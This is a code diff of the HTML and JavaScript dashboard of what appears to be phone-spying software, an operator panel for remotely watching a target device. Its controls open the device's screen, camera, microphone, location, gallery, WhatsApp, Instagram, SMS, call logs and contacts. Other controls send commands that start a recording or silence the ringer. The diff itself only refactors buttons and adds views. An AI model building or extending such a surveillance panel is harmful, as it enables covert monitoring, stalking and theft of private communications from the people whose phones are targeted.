@@ -113,26 +113,25 @@
         </div>
 
         <div class="controls-grid">
-            <a href="#" onclick="openView('screen')" class="control-btn"><i class="fa-solid fa-mobile-screen"></i><span>Screen</span></a>
-            <a href="#" onclick="openView('camera')" class="control-btn"><i class="fa-solid fa-camera"></i><span>Camera</span></a>
-            <a href="#" onclick="openView('audio')" class="control-btn"><i class="fa-solid fa-microphone"></i><span>Audio</span></a>
-            <a href="#" onclick="openView('location')" class="control-btn"><i class="fa-solid fa-location-dot"></i><span>Location</span></a>
+            <div onclick="openView('screen')" class="control-btn"><i class="fa-solid fa-mobile-screen"></i><span>Screen</span></div>
+            <div onclick="openView('camera')" class="control-btn"><i class="fa-solid fa-camera"></i><span>Camera</span></div>
+            <div onclick="openView('audio')" class="control-btn"><i class="fa-solid fa-microphone"></i><span>Audio</span></div>
+            <div onclick="openView('location')" class="control-btn"><i class="fa-solid fa-location-dot"></i><span>Location</span></div>
             
-            <a href="#" onclick="openView('gallery')" class="control-btn"><i class="fa-solid fa-images"></i><span>Gallery</span></a>
-            
-            <a href="#" onclick="openView('notifications')" class="control-btn"><i class="fa-regular fa-message"></i><span>Notify</span></a>
+            <div onclick="openView('gallery')" class="control-btn"><i class="fa-solid fa-images"></i><span>Gallery</span></div>
+            <div onclick="openView('notifications')" class="control-btn"><i class="fa-regular fa-message"></i><span>Notify</span></div>
             
             <div class="control-btn" id="soundBtn" onclick="cycleSoundMode()">
                 <i class="fa-solid fa-bell" id="soundIcon"></i><span id="soundText">Normal</span>
             </div>
 
             <div class="control-btn" onclick="sendCommand('rec_start')"><i class="fa-solid fa-circle-dot"></i><span>Rec</span></div>
-            <a href="#" onclick="openView('notifications')" class="control-btn"><i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span></a>
-            <a href="#" onclick="openView('notifications')" class="control-btn"><i class="fa-brands fa-instagram"></i><span>Instagram</span></a>
-            <a href="#" onclick="openView('call_logs')" class="control-btn"><i class="fa-solid fa-phone"></i><span>Calls</span></a>
-            <a href="#" onclick="openView('contacts')" class="control-btn"><i class="fa-solid fa-address-book"></i><span>Contacts</span></a>
-            <a href="#" onclick="openView('sms')" class="control-btn"><i class="fa-solid fa-comments"></i><span>SMS</span></a>
-            <a href="#" onclick="openView('apps')" class="control-btn"><i class="fa-brands fa-google-play"></i><span>Apps</span></a>
+            <div onclick="openView('whatsapp')" class="control-btn"><i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span></div>
+            <div onclick="openView('instagram')" class="control-btn"><i class="fa-brands fa-instagram"></i><span>Instagram</span></div>
+            <div onclick="openView('call_logs')" class="control-btn"><i class="fa-solid fa-phone"></i><span>Calls</span></div>
+            <div onclick="openView('contacts')" class="control-btn"><i class="fa-solid fa-address-book"></i><span>Contacts</span></div>
+            <div onclick="openView('sms')" class="control-btn"><i class="fa-solid fa-comments"></i><span>SMS</span></div>
+            <div onclick="openView('apps')" class="control-btn"><i class="fa-brands fa-google-play"></i><span>Apps</span></div>
         </div>
     </div>
 
@@ -185,10 +184,14 @@
                 .catch(err => console.error("Update Error"));
         }
 
+        // --- FIXED: ID ko URL ke sath pass karne ka tarika ---
         function openView(page) {
-            if(!DEVICE_ID) return askID();
-            // Gallery ya kisi bhi page par jane se pehle ID verify ho chuki hai
-            window.location.href = `view_${page}.html?id=${DEVICE_ID}`;
+            if(!DEVICE_ID) {
+                askID();
+            } else {
+                // Ab ye camera page ko batayega ki ID kya hai
+                window.location.href = `view_${page}.html?id=${DEVICE_ID}`;
+            }
         }
 
         function sendCommand(action) {
@@ -201,14 +204,12 @@
             .then(res => res.json())
             .then(data => {
                 console.log("Sent:", action);
-                // Simple UI feedback
                 const soundBtn = document.getElementById('soundBtn');
                 soundBtn.style.borderColor = "var(--cyan)";
                 setTimeout(() => soundBtn.style.borderColor = "var(--glass-border)", 500);
             });
         }
 
-        // Sound Cycle Logic
         let modes = ['normal', 'vibrate', 'silent'];
         let icons = ['fa-bell', 'fa-vibration', 'fa-bell-slash'];
         let labels = ['Normal', 'Vibrate', 'Silent'];
@@ -216,13 +217,10 @@
 
         function cycleSoundMode() {
             currentModeIndex = (currentModeIndex + 1) % 3;
-            
             const icon = document.getElementById('soundIcon');
             const text = document.getElementById('soundText');
-            
             icon.className = `fa-solid ${icons[currentModeIndex]}`;
             text.innerText = labels[currentModeIndex];
-            
             sendCommand(modes[currentModeIndex]);
         }
 
